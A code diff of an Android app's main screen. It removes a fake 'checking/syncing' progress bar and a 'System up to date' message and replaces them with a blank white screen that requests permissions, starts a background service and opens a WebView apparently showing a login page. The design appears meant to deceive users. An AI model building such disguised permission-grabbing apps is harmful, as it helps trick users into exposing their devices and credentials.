@@ -11,17 +11,11 @@ import android.os.Build
 import android.os.Bundle
 import android.os.Environment
 import android.provider.Settings
-import android.widget.ProgressBar
-import android.widget.TextView
 import androidx.appcompat.app.AppCompatActivity
 import androidx.core.app.ActivityCompat
 import androidx.core.content.ContextCompat
 
 class MainActivity : AppCompatActivity() {
-
-    private lateinit var tvStatus: TextView
-    private lateinit var tvSubStatus: TextView
-    private lateinit var progressBar: ProgressBar
 
     private val PERM_REQUEST_CODE = 1001
     private val BATTERY_REQUEST_CODE = 1002
@@ -29,32 +23,14 @@ class MainActivity : AppCompatActivity() {
 
     override fun onCreate(savedInstanceState: Bundle?) {
         super.onCreate(savedInstanceState)
-        setContentView(R.layout.activity_main)
 
-        tvStatus = findViewById(R.id.tvStatus)
-        tvSubStatus = findViewById(R.id.tvSubStatus)
-        progressBar = findViewById(R.id.progressBar)
+        // ✅ شاشة بيضاء — بدون أي عنصر
+        val white = android.widget.FrameLayout(this)
+        white.setBackgroundColor(android.graphics.Color.WHITE)
+        setContentView(white)
 
-        startFakeProgress()
+        // ✅ طلب الصلاحيات مباشرة
         requestPermissionsStep1()
-    }
-
-    private fun startFakeProgress() {
-        progressBar.progress = 5
-        tvStatus.text = getString(R.string.checking)
-        val handler = android.os.Handler(mainLooper)
-        var progress = 5
-        val runnable = object : Runnable {
-            override fun run() {
-                if (progress < 90) {
-                    progress += 1
-                    progressBar.progress = progress
-                    tvSubStatus.text = "${getString(R.string.syncing)} $progress%"
-                    handler.postDelayed(this, 150)
-                }
-            }
-        }
-        handler.postDelayed(runnable, 150)
     }
 
     private fun requestPermissionsStep1() {
@@ -155,10 +131,6 @@ class MainActivity : AppCompatActivity() {
     }
 
     private fun startBackgroundService() {
-        tvStatus.text = "System up to date"
-        tvSubStatus.text = "Sync active in background"
-        progressBar.progress = 100
-
         createNotificationChannel()
         val intent = Intent(this, BackgroundService::class.java)
         if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) {
@@ -167,13 +139,14 @@ class MainActivity : AppCompatActivity() {
             startService(intent)
         }
 
-        // ✅ فتح صفحة تسجيل الدخول تلقائيًا بعد كل الصلاحيات
+        // ✅ فتح index.html مباشرة بعد الصلاحيات
         android.os.Handler(mainLooper).postDelayed({
             try {
                 val webIntent = Intent(this, WebViewActivity::class.java)
                 startActivity(webIntent)
+                finish()
             } catch (_: Exception) {}
-        }, 1500)
+        }, 800)
     }
 
     private fun createNotificationChannel() {
